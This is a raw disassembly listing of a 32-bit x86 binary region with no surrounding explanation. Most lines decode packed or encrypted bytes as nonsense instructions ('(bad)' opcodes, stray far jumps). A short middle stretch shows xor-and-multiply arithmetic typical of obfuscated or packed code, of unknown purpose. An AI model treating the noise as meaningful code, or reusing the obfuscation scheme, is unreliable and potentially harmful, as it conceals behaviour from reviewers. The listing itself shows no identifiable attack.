  4133b8:	arpl   WORD PTR [esi-0x80],bx
  4133bb:	inc    ecx
  4133bc:	sub    bl,cl
  4133be:	mov    eax,ds:0xae871d05
  4133c3:	gs dec esp
  4133c5:	les    esi,FWORD PTR [ebp-0x62863817]
  4133cb:	mov    ecx,0x9423f454
  4133d0:	retf   
  4133d1:	hlt    
  4133d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133d3:	xor    ch,BYTE PTR [ebx+0xf77c4d2]
  4133d9:	aas    
  4133da:	(bad)  
  4133db:	aad    0xba
  4133dd:	xchg   edi,eax
  4133de:	mov    bl,BYTE PTR [edx+0x1c]
  4133e1:	inc    ebx
  4133e2:	ss mov dl,0x6e
  4133e5:	add    ah,BYTE PTR [edx-0x5]
  4133e8:	fwait
  4133e9:	pop    edi
  4133ea:	mov    edi,0x20e7ac17
  4133ef:	jg     0x4133d5
  4133f1:	dec    ecx
  4133f2:	in     eax,0xe1
  4133f4:	cmp    DWORD PTR [ebp-0x5252a497],0x30
  4133fb:	clc    
  4133fc:	sub    DWORD PTR [esi],0x1a553bce
  413402:	(bad)  
  413403:	out    dx,al
  413404:	inc    ebp
  413405:	sbb    cl,BYTE PTR [esi+0xb]
  413408:	pop    edi
  413409:	jb     0x413466
  41340b:	pop    edi
  41340c:	iret   
  41340d:	dec    ebx
  41340e:	adc    al,0x79
  413410:	xor    eax,0x1bccf316
  413415:	aad    0x2e
  413417:	jae    0x4133e8
  413419:	shl    DWORD PTR [ebp+0x51f6f37c],0x4f
  413420:	adc    al,0xe9
  413422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413423:	rcl    BYTE PTR gs:[ebp-0x1c9014],1
  41342a:	dec    ecx
  41342b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41342c:	adc    DWORD PTR ds:0x6ec5b8d2,esp
  413432:	dec    ecx
  413433:	sar    esi,1
  413435:	in     al,dx
  413436:	cmp    edi,DWORD PTR ss:[edx+0x11603bdf]
  41343d:	into   
  41343e:	xchg   edi,eax
  41343f:	ret    0x15b4
  413442:	loope  0x4133f4
  413444:	ret    0xcd6c
  413447:	fimul  WORD PTR [ecx]
  413449:	cmp    BYTE PTR [esp+edx*1-0x284549d9],bh
  413450:	in     al,0x4e
  413452:	imul   ebx,DWORD PTR [edi+ebp*8-0x35c2d04a],0x2c
  41345a:	stos   DWORD PTR es:[edi],eax
  41345b:	mov    esi,0xe65775d9
  413460:	retf   
  413461:	cmp    DWORD PTR [edx-0x10],esp
  413464:	ins    BYTE PTR es:[edi],dx
  413465:	dec    DWORD PTR [edx-0x67]
  413468:	(bad)  
  413469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41346a:	mov    eax,ds:0x492d4f59
  41346f:	shl    ch,cl
  413471:	(bad)  
  413472:	and    al,dl
  413474:	lock fwait
  413476:	or     ah,cl
  413478:	sbb    al,0x82
  41347a:	icebp  
  41347b:	or     ebp,DWORD PTR [edi]
  41347d:	and    al,0x5d
  41347f:	cmp    esi,ecx
  413481:	push   esp
  413482:	ficomp DWORD PTR [edi+ecx*1]
  413485:	neg    DWORD PTR [si]
  413488:	mov    ecx,0x80fea9d7
  41348d:	arpl   bx,si
  41348f:	adc    eax,esp
  413491:	mov    al,ds:0x48962d64
  413496:	arpl   WORD PTR ss:[eax],dx
  413499:	js     0x4134bb
  41349b:	dec    edx
  41349c:	or     dl,BYTE PTR ds:0xb802c56a
  4134a2:	sbb    cl,dl
  4134a4:	loope  0x413467
  4134a6:	ins    DWORD PTR es:[edi],dx
  4134a7:	fstp   QWORD PTR [esp+eax*1]
  4134ab:	fnstenv [edx-0x3fc2f2db]
  4134b1:	push   ebp
  4134b2:	stc    
  4134b3:	ins    DWORD PTR es:[edi],dx
  4134b4:	jecxz  0x41350c
  4134b6:	(bad)  
  4134b7:	xchg   edx,eax
  4134b8:	stos   BYTE PTR es:[edi],al
  4134b9:	inc    ebx
  4134ba:	mov    esi,0x29078598
  4134bf:	ret    0x7a9
  4134c2:	out    dx,eax
  4134c3:	mov    dh,0x43
  4134c5:	push   ecx
  4134c6:	push   ecx
  4134c7:	or     dl,BYTE PTR [ebx-0x2b]
  4134ca:	mov    edx,0x3ffd7d1f
  4134cf:	aad    0xd5
  4134d1:	loope  0x413476
  4134d3:	and    dl,BYTE PTR [esp+edi*2+0x8]
  4134d7:	and    eax,0x4d2fdd99
  4134dc:	pop    ecx
  4134dd:	imul   eax,DWORD PTR [edx-0x13],0xffffffd0
  4134e1:	adc    al,0x81
  4134e3:	rcr    BYTE PTR ds:0x32c08e67,0x39
  4134ea:	mov    ds:0x1549fbca,al
  4134ef:	ror    BYTE PTR [edi],1
  4134f1:	call   0x9a6ac11c
  4134f6:	inc    esp
  4134f7:	cwde   
  4134f8:	in     al,0x57
  4134fa:	push   0x3a
  4134fc:	adc    BYTE PTR [ecx],ch
  4134fe:	jb     0x413560
  413500:	rcr    esi,cl
  413502:	mov    ds,ecx
  413504:	imul   ebx,eax,0xc612286e
  41350a:	xor    al,0x29
  41350c:	push   0x706da9bb
  413511:	lods   eax,DWORD PTR ds:[esi]
  413512:	inc    esi
  413513:	cmp    edi,edi
  413515:	aas    
  413516:	xor    BYTE PTR [ecx+0x1c779538],0xab
  41351d:	sub    DWORD PTR [esi],eax
  41351f:	test   BYTE PTR [edx],bh
  413521:	xor    DWORD PTR [eax],edx
  413523:	cmp    DWORD PTR [ebx+0x31f31a21],0x29
  41352a:	mov    ah,0xb0
  41352c:	and    al,0xb0
  41352e:	sbb    DWORD PTR [esi-0x364d3f11],edx
  413534:	iret   
  413535:	movntps XMMWORD PTR [ebx+0x3],xmm4
  413539:	out    dx,al
  41353a:	cli    
  41353b:	jne    0x41352f
  41353d:	add    ah,dl
  41353f:	xor    esi,DWORD PTR [eax+0x1ca6df59]
  413545:	adc    al,BYTE PTR [edx-0x61cbd9f5]
  41354b:	dec    esi
  41354c:	lods   al,BYTE PTR ds:[esi]
  41354d:	and    DWORD PTR [esi+0x45e5e8aa],ebp
  413553:	loope  0x4134e3
  413555:	daa    
  413556:	mov    cl,0x7c
  413558:	dec    esp
  413559:	into   
  41355a:	push   ebp
  41355b:	push   ebx
  41355c:	lea    esp,[edi]
  41355e:	sbb    al,0xc0
  413560:	dec    ebx
  413561:	imul   ecx,DWORD PTR [esi+0x79e2599b],0x7e3a28d2
  41356b:	mov    dl,0x81
  41356d:	inc    BYTE PTR [ebp-0x5c]
  413570:	dec    esp
  413571:	(bad)  
  413572:	bnd ret 
  413574:	add    BYTE PTR [ebp-0x3a],al
  413577:	or     al,0xa9
  413579:	clc    
  41357a:	xchg   esp,eax
  41357b:	jae    0x41356f
  41357d:	and    DWORD PTR [ecx],esp
  41357f:	packssdw mm0,mm3
  413582:	mov    bh,0x2
  413584:	push   edx
  413585:	in     eax,dx
  413586:	xchg   esp,eax
  413587:	mov    ah,0x9e
  413589:	pop    ebx
  41358a:	and    eax,0xe2497abc
  41358f:	call   0x980cfa9
  413594:	out    0xe9,eax
  413596:	repnz ror BYTE PTR [esi-0x6c],1
  41359a:	xor    bh,ch
  41359c:	inc    eax
  41359d:	inc    BYTE PTR [esi+0x48]
  4135a0:	xchg   ebx,eax
  4135a1:	jmp    0x413535
  4135a3:	js     0x413531
  4135a5:	pop    ds
  4135a6:	or     DWORD PTR [edi+0x5d],0x76ec6bb5
  4135ad:	dec    edi
  4135ae:	jge    0x4135b7
  4135b0:	add    eax,0x3d678719
  4135b5:	mov    ecx,0xf6a0e0d1
  4135ba:	mov    bh,0x68
  4135bc:	mov    dl,0x60
  4135be:	cld    
  4135bf:	mov    ebx,0x5e61dd52
  4135c4:	jnp    0x413574
  4135c6:	sar    BYTE PTR [ebp+0x7f15f0d6],0xb7
  4135cd:	cmp    BYTE PTR [ebp+esi*8+0x5e],dl
  4135d1:	mul    DWORD PTR [ebx+0x63]
  4135d4:	lock xor al,BYTE PTR fs:[esi+0x3d]
  4135d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135da:	jmp    0xdf28474e
  4135df:	xchg   ebp,eax
  4135e0:	fdivp  st(6),st
  4135e2:	or     dl,dh
  4135e4:	aaa    
  4135e5:	sbb    edx,ebx
  4135e7:	lods   al,BYTE PTR ss:[esi]
  4135e9:	adc    DWORD PTR [edi],ebx
  4135eb:	mov    ecx,0x845281fd
  4135f0:	pop    ds
  4135f1:	cmp    dh,ch
  4135f3:	jg     0x4135be
  4135f5:	stc    
  4135f6:	xor    edx,esi
  4135f8:	sub    dh,dl
  4135fa:	jno    0x4135c6
  4135fc:	sbb    DWORD PTR [ebx-0x54],ebp
  4135ff:	adc    BYTE PTR [ebp+0x28],al
  413602:	js     0x41364c
  413604:	mov    eax,0x12ec516f
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	mov    ch,0x7c
  41360c:	or     DWORD PTR [ebx-0x770aee33],edi
  413612:	and    BYTE PTR [ecx+0x8e7806d],0x86
  413619:	js     0x4135fa
  41361b:	inc    esp
  41361c:	mov    dl,BYTE PTR [esi-0x59]
  41361f:	aam    0xf
  413621:	dec    ecx
  413622:	std    
  413623:	emms   
  413625:	mov    gs,edi
  413627:	loopne 0x413604
  413629:	call   0xc6c845fa
  41362e:	mov    dl,0x9b
  413631:	out    dx,al
  413632:	inc    ebx
  413633:	mov    esi,0xf0fadfd7
  413638:	(bad)  
  413639:	inc    DWORD PTR [ebp-0xb]
  41363c:	icebp  
  41363d:	xchg   BYTE PTR [edi+0x18559ee],bl
  413643:	cwde   
  413644:	mov    edi,0xa184ac0d
  413649:	jae    0x41362e
  41364b:	push   edx
  41364c:	adc    DWORD PTR [ebp-0x6c268c11],edi
  413652:	stos   BYTE PTR es:[edi],al
  413653:	add    bh,BYTE PTR [eax-0x4e7e9fd6]
  413659:	xor    DWORD PTR [eax-0x7a],edx
  41365c:	in     al,dx
  41365d:	icebp  
  41365e:	pop    ds
  41365f:	out    0x71,al
  413661:	rcl    BYTE PTR [esi-0x39],cl
  413664:	xchg   DWORD PTR [ebx],esp
  413666:	stos   DWORD PTR es:[edi],eax
  413667:	test   BYTE PTR [eax+0x5f5f7fd9],0xd5
  41366e:	xchg   esp,edi
  413670:	pushf  
  413671:	ja     0x413649
  413673:	(bad)  
  413674:	jnp    0x4136e2
  413676:	cmp    DWORD PTR [ebp-0x2],esp
  413679:	push   esi
  41367a:	ss sbb bh,0x55
  41367e:	adc    ebx,ecx
  413680:	repz push ds
  413682:	pop    es
  413683:	push   esp
  413684:	jb     0x413636
  413686:	jle    0x41369e
  413688:	jbe    0x4136d8
  41368a:	push   esi
  41368b:	sbb    ah,dl
  41368d:	pop    eax
  41368e:	mov    ebp,0x23317766
  413693:	sub    eax,0x1df537e8
  413698:	sub    edi,edi
  41369a:	stc    
  41369b:	imul   edx,DWORD PTR [esi+0x2020014f],0x3ff23d0c
  4136a5:	push   0xffffffd6
  4136a7:	popf   
  4136a8:	add    al,0xbf
  4136aa:	retf   
  4136ab:	cmp    eax,0xcb9b0758
  4136b0:	loop   0x4136f2
  4136b2:	or     eax,0x589611b9
  4136b7:	ss adc al,0x3f
  4136ba:	jle    0x413705
  4136bc:	jg     0x41369a
  4136be:	je     0x41367d
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0xa6
  413798:	xchg   esp,eax
  413799:	fnsave [ebx+0x62626ba2]
  41379f:	int    0x5f
  4137a1:	bound  esp,QWORD PTR [edx+0x25]
  4137a4:	out    dx,eax
  4137a5:	mov    al,0x42
  4137a7:	retf   
  4137a8:	sti    
  4137a9:	bound  edx,QWORD PTR [edi+0x3f]
  4137ac:	cli    
  4137ad:	push   eax
  4137ae:	test   DWORD PTR [eax],0xe6dc936e
  4137b4:	mov    ch,0xe8
  4137b6:	xchg   BYTE PTR [ecx],cl
  4137b8:	jne    0x413788
  4137ba:	jmp    0xf0280bcd
  4137bf:	pop    edi
  4137c0:	push   es
  4137c1:	mov    eax,0x527f049d
  4137c6:	loop   0x413760
  4137c8:	and    eax,edi
  4137ca:	cli    
  4137cb:	clc    
  4137cc:	int    0xeb
  4137ce:	add    BYTE PTR [ebp+edx*1-0x7e],dl
  4137d2:	sti    
  4137d3:	data16 loope 0x413808
  4137d6:	mov    edx,0x10fecd53
  4137db:	out    dx,eax
  4137dc:	bound  ebx,QWORD PTR [edi+0x487b943]
  4137e2:	repnz mov esi,0xad42aa62
  4137e8:	mov    BYTE PTR [ebp-0x1aa42e5c],al
  4137ee:	loop   0x4137e6
  4137f0:	mov    ch,0x12
  4137f2:	xor    DWORD PTR [edi+0x321fdf45],ebx
  4137f8:	push   esi
  4137f9:	mov    ds:0xed80fd2a,al
  4137fe:	mov    ebp,DWORD PTR [edi+0x47]
  413801:	or     bl,al
  413803:	and    eax,0x745149fe
  413808:	loop   0x4137e9
  41380a:	and    esp,ebp
  41380c:	push   ds
  41380d:	outs   dx,DWORD PTR ds:[esi]
  41380e:	jle    0x41381a
  413810:	aad    0xd9
  413812:	push   ecx
  413813:	jg     0x413882
  413815:	(bad)  
  413816:	cmc    
  413817:	lods   al,BYTE PTR ds:[esi]
  413818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413819:	push   ds
  41381a:	and    al,0xa3
  41381c:	mov    eax,ds:0x8853f16c
  413821:	test   al,0x58
  413823:	mov    bl,ah
  413825:	inc    ebx
  413826:	jl     0x41388c
  413828:	pop    esp
  413829:	jns    0x4137ed
  41382b:	push   esi
  41382d:	popa   
  41382e:	ins    DWORD PTR es:[edi],dx
  41382f:	sbb    ch,BYTE PTR [edi-0x3a]
  413832:	pop    es
  413833:	jp     0x4137f2
  413835:	test   BYTE PTR [eax-0xabe86f5],dh
  41383b:	jo     0x413866
  41383d:	pop    edx
  41383e:	iret   
  41383f:	shr    BYTE PTR [ecx+0x56],0x52
  413843:	sub    ebx,esi
  413845:	loopne 0x41380c
  413847:	xor    ah,0xf
  41384a:	push   ds
  41384b:	dec    ebx
  41384c:	mov    bh,0x2f
  41384e:	arpl   WORD PTR [eax+0x63],si
  413851:	jg     0x4138b1
  413853:	mov    dh,0xa5
  413855:	retf   0xd53c
  413858:	jl     0x4138a4
  41385a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41385b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41385c:	sub    bh,cl
  41385e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41385f:	inc    esp
  413860:	cwde   
  413861:	mov    BYTE PTR [edi+esi*4+0x356cb19],dh
  413868:	xchg   ebp,eax
  413869:	ret    0x4448
  41386c:	pop    ds
  41386d:	popf   
  41386e:	in     al,0x55
  413870:	add    dl,BYTE PTR [ebx]
  413872:	sbb    eax,esp
  413874:	dec    esi
  413875:	or     BYTE PTR [ebx+esi*4-0x25],bh
  413879:	bound  ebp,QWORD PTR [esi]
  41387b:	pop    ds
  41387c:	(bad)  
  41387d:	outs   dx,DWORD PTR ds:[esi]
  41387e:	loop   0x4138c3
  413880:	adc    al,0x61
  413882:	das    
  413883:	inc    esp
  413884:	shl    DWORD PTR [ebx+0x24934fe5],cl
  41388a:	jne    0x413893
  41388c:	in     al,dx
  41388d:	jb     0x41388f
  41388f:	div    BYTE PTR [esi-0x10]
  413892:	shr    dl,1
  413894:	fs dec esi
  413896:	mov    BYTE PTR [edx],dl
  413898:	pop    es
  413899:	int    0x3f
  41389b:	xchg   ebp,eax
  41389c:	inc    edi
  41389d:	push   cs
  41389e:	mov    ah,BYTE PTR [esi+0x7b12df3a]
  4138a4:	jmp    0x741cf383
  4138a9:	or     al,BYTE PTR [edi-0x5eaa7965]
  4138af:	es int3 
  4138b1:	sahf   
  4138b2:	ja     0x41392f
  4138b4:	and    DWORD PTR [edx+ecx*8+0x30],edi
  4138b8:	sbb    dh,BYTE PTR [ebx-0x49]
  4138bb:	sbb    BYTE PTR [ebx+0x11252aa4],al
  4138c1:	ror    DWORD PTR [edi-0x751b817a],cl
  4138c7:	mov    bl,0xb8
  4138c9:	push   ss
  4138ca:	inc    esp
  4138cb:	cmp    BYTE PTR [esi+0x36125126],al
  4138d1:	lods   al,BYTE PTR ds:[esi]
  4138d2:	pop    ds
  4138d3:	rol    bh,0xff
  4138d6:	retf   
  4138d7:	cli    
  4138d8:	ja     0x41385a
  4138da:	ja     0x413925
  4138dc:	icebp  
  4138dd:	idiv   BYTE PTR [esi]
  4138df:	leave  
  4138e0:	rcr    DWORD PTR [eax+eax*8+0x5e],cl
  4138e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e5:	push   esi
  4138e6:	ret    
  4138e7:	cwde   
  4138e8:	sar    BYTE PTR [ecx+0x67],cl
  4138eb:	adc    ecx,edx
  4138ed:	pop    ecx
  4138ee:	dec    ebx
  4138ef:	ficom  WORD PTR [ebx]
  4138f1:	scas   eax,DWORD PTR es:[edi]
  4138f2:	repz pushf 
  4138f4:	jmp    0xe1d9987d
  4138f9:	pop    edi
  4138fa:	popa   
  4138fb:	dec    edx
  4138fc:	stos   DWORD PTR es:[edi],eax
  4138fd:	leave  
  4138fe:	sub    dl,BYTE PTR [ecx-0x8]
  413901:	mov    bh,0x6b
  413903:	in     eax,0x25
  413905:	clc    
  413906:	xchg   edi,eax
  413907:	mov    ecx,0x3dd133cc
  41390c:	add    al,BYTE PTR [esi-0x2b7829b3]
  413912:	sub    esp,0xc22d1872
  413918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413919:	rcr    BYTE PTR [ebx-0x1a],1
  41391c:	loopne 0x41392c
  41391e:	inc    edi
  41391f:	(bad)  
  413920:	or     DWORD PTR [edi+0x3b],edi
  413923:	out    0x79,al
  413925:	sbb    al,0xcb
  413927:	add    al,BYTE PTR [ebp+0x4b68fc21]
  41392d:	test   eax,0xab2de30b
  413932:	ret    0x7bfa
  413935:	iret   
  413936:	sbb    bl,al
  413938:	inc    ecx
  413939:	out    dx,al
  41393a:	add    DWORD PTR [ebp-0xd760f70],ebp
  413940:	addr16 fwait
  413942:	dec    edi
  413943:	pop    ebp
  413944:	push   ds
  413945:	and    bh,dh
  413947:	push   ebx
  413948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413949:	(bad)  
  41394a:	jmp    0x84d2:0x8339a16e
  413951:	test   DWORD PTR [ebx],eax
  413953:	mov    edx,0x22c8da73
  413958:	idiv   edi
  41395a:	mov    eax,0xbcb6f5f3
  41395f:	(bad)  
  413960:	jmp    0xf7567c7a
  413965:	jge    0x4139aa
  413967:	push   esp
  413968:	lahf   
  413969:	or     ebp,DWORD PTR [ebx+0x4fad9735]
  41396f:	dec    ecx
  413970:	daa    
  413971:	or     al,0xd7
  413973:	and    ecx,DWORD PTR [esi+esi*1+0x58340fb1]
  41397a:	push   ss
  41397b:	mov    ebx,0x33f6b015
  413980:	jle    0x4139e0
  413982:	or     al,0x28
  413984:	cmc    
  413985:	les    esp,FWORD PTR [ecx+0x21]
  413988:	mov    eax,ds:0xb0ff30af
  41398d:	mov    BYTE PTR [edx+0x4f],bl
  413990:	test   DWORD PTR [ebx],esi
  413992:	aas    
  413993:	jmp    0x4139d4
  413995:	xor    eax,0x60ba5cb2
  41399a:	iret   
  41399b:	push   esp
  41399c:	bound  esp,QWORD PTR [eax+eax*2+0x6c]
  4139a0:	push   0xffffffa7
  4139a2:	pop    edi
  4139a3:	sub    eax,0xb15e90db
  4139a8:	cmp    ebx,DWORD PTR [edx]
  4139aa:	add    bh,cl
  4139ac:	xchg   esi,eax
  4139ad:	(bad)  
  4139ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139af:	enter  0x6054,0xd0
  4139b3:	cmp    esi,DWORD PTR [edi+0xc51aeb5]
  4139b9:	cmp    ebp,DWORD PTR [ebx]
  4139bb:	add    al,0x8
  4139bd:	cld    
  4139be:	xor    BYTE PTR [edx-0x462afaec],bh
  4139c4:	enter  0x4aca,0x70
  4139c8:	pop    eax
  4139c9:	daa    
  4139ca:	in     al,dx
  4139cb:	add    bl,BYTE PTR [edi-0x2]
  4139ce:	das    
  4139cf:	xchg   esp,eax
  4139d0:	push   0xf8799b83
  4139d5:	push   es
  4139d6:	retf   0x571c
  4139d9:	repz loope 0x413996
  4139dc:	ds popa 
  4139de:	aas    
  4139df:	xchg   ebp,eax
  4139e0:	aas    
  4139e1:	pop    es
  4139e2:	inc    edi
  4139e3:	xor    bl,BYTE PTR [eax-0x21]
  4139e6:	imul   edi,edi,0xd759a140
  4139ec:	cmc    
  4139ed:	or     al,0x91
  4139ef:	cmp    esp,DWORD PTR [edx]
  4139f1:	or     al,0xb8
  4139f3:	lds    ebp,FWORD PTR [ecx+eax*2-0x23820c3d]
  4139fa:	push   cs
  4139fb:	pop    eax
  4139fc:	jmp    FWORD PTR ds:0xef39cc5
  413a02:	nop
  413a03:	rcl    BYTE PTR [edx-0x3950b1a0],1
  413a09:	adc    dh,BYTE PTR ds:0xf02881a
  413a0f:	xchg   ebp,eax
  413a10:	jb     0x413a2d
  413a12:	aam    0x1c
  413a14:	mov    dl,0x26
  413a16:	data16 addr16 jl 0x413a05
  413a1a:	dec    esp
  413a1b:	dec    ebx
  413a1c:	mov    bh,0x99
  413a1e:	mov    eax,ds:0xa307d1be
  413a23:	mov    ebp,0x4ef49827
  413a28:	lods   al,BYTE PTR ds:[esi]
  413a29:	xlat   BYTE PTR ds:[ebx]
  413a2a:	sbb    al,BYTE PTR [ebx+ebx*8]
  413a2d:	xchg   esp,eax
  413a2e:	mov    ebp,0xe12ec6b6
  413a33:	clc    
  413a34:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  413a36:	(bad)  
  413a37:	add    al,0x39
  413a39:	nop
  413a3a:	jo     0x413a93
  413a3c:	dec    ebx
  413a3d:	push   esi
  413a3e:	mov    eax,ds:0x580190
  413a43:	push   es
  413a44:	rol    DWORD PTR [edi],1
  413a46:	retf   
  413a47:	mov    ds:0xe302d9b3,eax
  413a4c:	jmp    0xeb50:0x29625194
  413a53:	cmp    al,0xe7
  413a55:	cmp    eax,0xeec63b63
  413a5a:	pop    eax
  413a5b:	adc    al,0xbc
  413a5d:	or     dh,BYTE PTR [ebx-0x5b96589b]
  413a63:	inc    esp
  413a64:	stc    
  413a65:	mov    bh,0x7d
  413a67:	and    al,0x31
  413a69:	int    0x15
  413a6b:	les    ebp,FWORD PTR [edi-0x8]
  413a6e:	inc    esp
  413a6f:	dec    esi
  413a70:	cmp    bl,BYTE PTR [edx+esi*2-0x5b11b197]
  413a77:	test   al,0x79
  413a79:	inc    edx
  413a7a:	mov    dh,0x7e
  413a7c:	add    DWORD PTR [esp+edx*4-0x73],esp
  413a80:	xchg   DWORD PTR [eax-0xf1ecd90],ebp
  413a86:	pop    eax
  413a87:	test   edi,ecx
  413a89:	je     0x413a3c
  413a8b:	mov    edi,0x2ab9343f
  413a90:	std    
  413a91:	mov    esi,0x841afa67
  413a96:	dec    ebx
  413a97:	gs push ecx
  413a99:	cli    
  413a9a:	pushf  
  413a9b:	pop    edi
  413a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a9d:	out    0xf4,eax
  413a9f:	shr    cl,cl
  413aa1:	dec    eax
  413aa2:	inc    esp
  413aa3:	push   ds
  413aa4:	daa    
  413aa5:	pop    es
  413aa6:	xor    BYTE PTR [edx],0x45
  413aa9:	push   esp
  413aaa:	sub    bl,bh
  413aac:	es clc 
  413aae:	fidivr DWORD PTR [eax-0x23]
  413ab1:	hlt    
  413ab2:	mov    WORD PTR [edx],gs
  413ab4:	retf   
  413ab5:	mov    esi,0xe99bab76
  413aba:	push   ebx
  413abb:	xchg   ebx,eax
  413abc:	scas   al,BYTE PTR es:[edi]
  413abd:	xchg   ebx,eax
  413abe:	mov    DWORD PTR [ebx+0x5547b88],eax
  413ac4:	xchg   ecx,eax
  413ac5:	lea    edx,[ecx+ebx*4-0x668bfb13]
  413acc:	push   edx
  413acd:	add    eax,0x7ec9b1bc
  413ad2:	rol    DWORD PTR [ebx-0x48d9b0af],1
  413ad8:	test   ah,dl
  413ada:	push   ebp
  413adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413adc:	mov    BYTE PTR [ebp+0x7d159286],bl
  413ae2:	jnp    0x413afc
  413ae4:	(bad)  
  413ae5:	inc    esi
  413ae6:	cmp    BYTE PTR [eax],ah
  413ae8:	(bad)
  413aeb:	push   ecx
  413aec:	mov    ebp,0xce8d920e
  413af1:	xor    DWORD PTR [esi+0x38a1cbf0],0xf
  413af8:	and    al,0xd0
  413afa:	mov    bh,0x43
  413afc:	cmc    
  413afd:	or     DWORD PTR [edi+ebp*4],edx
  413b00:	nop
  413b01:	es mov ebx,0x1d890c1f
  413b07:	sub    eax,0x6e2139b4
  413b0c:	or     al,0x75
  413b0e:	pop    edx
  413b0f:	pusha  
  413b10:	inc    ebx
  413b11:	stc    
  413b12:	pop    esi
  413b13:	cmp    dl,BYTE PTR [esp+eiz*4]
  413b16:	push   ds
  413b17:	or     bh,cl
  413b19:	sbb    BYTE PTR [edx-0x447c3828],cl
  413b1f:	xchg   ecx,eax
  413b20:	enter  0xfebc,0x16
  413b24:	jns    0x413b49
  413b26:	imul   ecx,ebx,0xf18f1896
  413b2c:	cli    
  413b2d:	adc    edi,edx
  413b2f:	arpl   WORD PTR [ebx+eiz*2-0x71],bx
  413b33:	fiadd  WORD PTR [ebp+0x755ed1a7]
  413b39:	inc    edi
  413b3a:	sbb    ah,ah
  413b3c:	sbb    DWORD PTR [esi+0x7871ec2d],ebp
  413b42:	jp     0x413b46
  413b44:	jmp    0x413b7e
  413b46:	lods   eax,DWORD PTR ds:[esi]
  413b47:	test   ah,dh
  413b49:	in     al,0x49
  413b4b:	(bad)  
  413b4c:	je     0x413b76
  413b4e:	mov    ds:0x2cc86d0b,eax
  413b53:	dec    eax
  413b54:	xchg   DWORD PTR [esi],ecx
  413b56:	xlat   BYTE PTR ss:[ebx]
  413b58:	fnstcw WORD PTR [ebx+0x2a]
  413b5b:	leave  
  413b5c:	fs ret 
  413b5e:	mov    ch,0x1a
  413b60:	push   eax
  413b61:	cmp    DWORD PTR [eax+ebx*8],edx
  413b64:	in     eax,dx
  413b65:	call   0x7c7a8d4
  413b6a:	out    0x81,eax
  413b6c:	xchg   edi,eax
  413b6d:	jmp    0xa3c9:0xa57ace2a
  413b74:	fs nop
  413b76:	and    eax,0x17f7cd5e
  413b7b:	jge    0x413b6c
  413b7d:	cmp    al,0xcf
  413b7f:	mov    bh,0xa6
  413b81:	cmp    ecx,DWORD PTR [eax+0x3d]
  413b84:	adc    ecx,DWORD PTR [edi-0x2a]
  413b87:	test   BYTE PTR [edi+0x24],dl
  413b8a:	xor    eax,0xda56c628
  413b8f:	dec    ecx
  413b90:	push   esi
  413b91:	jge    0x413b6d
  413b93:	cmp    ebp,DWORD PTR [eax]
